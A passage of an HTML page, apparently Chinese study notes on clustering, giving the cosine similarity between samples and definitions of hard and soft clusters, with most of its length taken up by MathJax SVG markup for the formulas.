36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(8973.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(10029.7,0)"><g data-mml-node="mn" transform="translate(353.6,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(220,-345) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="820.8" height="60" x="120" y="220"></rect></g><g data-mml-node="munderover" transform="translate(11257.2,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z"></path></g><g data-mml-node="mi" transform="translate(1089,477.1) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1299,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="msub" transform="translate(13834.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></g></svg></mjx-container>。</p><h3 id="6-1-4-夹角余弦"><a href="#6-1-4-夹角余弦" class="headerlink" title="6.1.4 夹角余弦"></a>6.1.4 夹角余弦</h3><p>夹角余弦越接近于1，表示样本越相似；越接近于0，表示样本越不相似。</p><p>样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>与样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>之间的夹角余弦定义为：</p><script type="math/tex; mode=display">s_{ij}=\frac{\sum_{k=1}^mx_{ki}x_{kj}}{[\sum_{k=1}^mx_{ki}^2\sum_{k=1}^mx_{kj}^2]^\frac12}</script><h2 id="9-2-类或簇"><a href="#9-2-类或簇" class="headerlink" title="9.2 类或簇"></a>9.2 类或簇</h2><p>通过聚类得到的类或簇，本质是样本的子集。</p><p>硬聚类：一个样本只能属于一个类，或类的交集为空集。</p><p>软聚类：一个样本可以属于多个类，或类的交集不为空集。</p><p>用G表示类或簇(cluster)，用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="5.181ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 2289.9 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(899,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1343.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>表示类中的样本，用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.803ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1238.8 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g></g></svg></mjx-container>表示G中样本的个数，用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.575ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 1138.3 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></g></svg></mjx-container>表示样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>与样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>之间的距离。</p><p>定义1：设T为给定的正数，若集合G中任意两个样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="5.181ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 2289.9 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(899,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1343.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 